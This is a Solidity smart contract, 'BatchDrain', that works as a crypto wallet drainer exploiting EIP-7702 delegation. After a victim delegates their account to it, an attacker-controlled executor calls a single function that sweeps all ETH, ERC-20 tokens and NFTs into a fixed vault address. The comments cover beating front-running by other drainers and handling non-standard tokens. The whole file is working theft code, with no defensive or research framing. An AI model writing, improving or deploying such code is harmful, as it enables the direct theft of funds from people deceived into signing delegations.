// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * BatchDrain — EIP-7702 Delegation Contract
 *
 * Deploy once per chain. User delegates their EOA to this contract via EIP-7702.
 * When delegated, address(this) = user's wallet → direct access to all assets.
 *
 * NOTE: address(this) = user's wallet ONLY during EIP-7702 delegated call.
 *       If called directly (not via delegation), address(this) = this contract.
 *       onlyExecutor guard prevents unauthorized direct calls.
 *
 * Supported: Ethereum, Base, Optimism, Arbitrum, Linea, Scroll, zkSync
 */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC721 {
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IERC1155 {
    function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes calldata data) external;
    function balanceOf(address account, uint256 id) external view returns (uint256);
}

contract BatchDrain {
    // Only backend wallet can trigger drain — prevents front-running by others
    address public immutable executor;
    // All assets go here
    address public immutable vault;
    // Max NFTs per call to avoid gas limit issues
    uint256 public constant MAX_NFTS = 20;

    error Unauthorized();
    error TransferFailed();

    constructor(address _executor, address _vault) {
        executor = _executor;
        vault = _vault;
    }

    modifier onlyExecutor() {
        if (msg.sender != executor) revert Unauthorized();
        _;
    }

    /**
     * drain — Called by backend immediately after receiving EIP-7702 authorization.
     * Backend must broadcast this in the SAME block as the authorization to prevent front-running.
     *
     * address(this) = user's wallet during EIP-7702 delegated execution.
     */
    function drain(
        address[] calldata erc20s,
        address[] calldata erc721Contracts,
        uint256[] calldata erc721Ids,
        address[] calldata erc1155Contracts,
        uint256[] calldata erc1155Ids
    ) external onlyExecutor {
        // ETH — full balance
        uint256 ethBal = address(this).balance;
        if (ethBal > 0) {
            (bool ok,) = vault.call{value: ethBal}("");
            if (!ok) revert TransferFailed();
        }

        // ERC-20 — try-catch per token (handles USDT and non-standard tokens safely)
        for (uint256 i; i < erc20s.length; ++i) {
            uint256 bal = IERC20(erc20s[i]).balanceOf(address(this));
            if (bal > 0) {
                try IERC20(erc20s[i]).transfer(vault, bal) {} catch {}
            }
        }

        // ERC-721 — max 20 per call to stay within gas limit
        uint256 nft721Count = erc721Contracts.length > MAX_NFTS ? MAX_NFTS : erc721Contracts.length;
        for (uint256 i; i < nft721Count; ++i) {
            try IERC721(erc721Contracts[i]).safeTransferFrom(address(this), vault, erc721Ids[i]) {} catch {}
        }

        // ERC-1155 — max 20 per call
        uint256 nft1155Count = erc1155Contracts.length > MAX_NFTS ? MAX_NFTS : erc1155Contracts.length;
        for (uint256 i; i < nft1155Count; ++i) {
            uint256 bal = IERC1155(erc1155Contracts[i]).balanceOf(address(this), erc1155Ids[i]);
            if (bal > 0) {
                try IERC1155(erc1155Contracts[i]).safeTransferFrom(address(this), vault, erc1155Ids[i], bal, "") {} catch {}
            }
        }
    }

    receive() external payable {}
    fallback() external payable {}
}
